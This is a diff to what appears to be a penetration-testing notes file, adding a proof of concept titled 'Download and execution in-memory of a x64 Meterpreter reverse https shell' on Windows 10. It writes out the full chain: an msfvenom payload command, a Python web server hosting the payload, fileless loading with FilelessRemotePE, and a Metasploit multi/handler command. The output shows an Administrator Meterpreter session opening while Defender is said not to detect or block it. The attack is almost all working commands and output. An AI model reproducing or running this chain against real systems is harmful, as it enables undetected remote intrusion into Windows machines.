@@ -682,6 +682,20 @@ Bye!
 Test/PoC 2 - Download and execution in-memory of a x64 Meterpreter reverse https shell on a Windows 10 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+=> Step 1 - Generate a (x64) Meterpreter reverse https shell with msfvenom and host it on a web server
+-------------------------------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f exe -o meterpreter-x64-reverse-https.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of exe file: 207872 bytes
+Saved as: meterpreter-x64-reverse-https.exe
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$  python3 -m http.server 8080
+
+
+=> Step 2 - Load directly into memory the (x64) Meterpreter reverse https shell using the tool "FilelessRemotePE" on a target Windows 10
+-----------------------------------------------------------------------------------------------------------------------------------------
 Microsoft Windows [Version 10.0.19044.2364]
 (c) Microsoft Corporation. All rights reserved.
 
@@ -699,7 +713,60 @@ http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe
 [+] Run PE
 
 
+=> Step 3 - You have now a meterprter shell running without being detected nor blocked by the MS Defender AV
+-------------------------------------------------------------------------------------------------------------
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
+[sudo] password for jeff: 
+[!] The following modules were loaded with warnings:
+[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
+[!] Please see /root/.msf4/logs/framework.log for details.
+                                                  
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
 
+Metasploit tip: To save all commands executed since start up 
+to a file, use the makerc command
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+msf6 exploit(multi/handler) > 
+msf6 exploit(multi/handler) > jobs -l
+
+Jobs
+====
+
+  Id  Name                    Payload                                Payload opts
+  --  ----                    -------                                ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter_reverse_https  https://192.168.1.30:443
+
+msf6 exploit(multi/handler) > 
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Redirecting stageless connection from /NGLfszJmUfFG6kfoJXTfdwDbqpn2JFtkiVOXA5gTsBJ0C1GNjeKjMH031zX4BOdlup76N88hjiM6b6hmVS1Eiv1KbD1_PSXSFxw_e01g1B0UDvCuZlfEsluNJZxv with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Attaching orphaned/stageless session...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 2 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-18 05:39:59 +0100
+
+msf6 exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: Laptopwin10\Administrator
+meterpreter > 
+<SNIP>
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 3.2 Example of AV bypass using the tool 'EAPrimer'
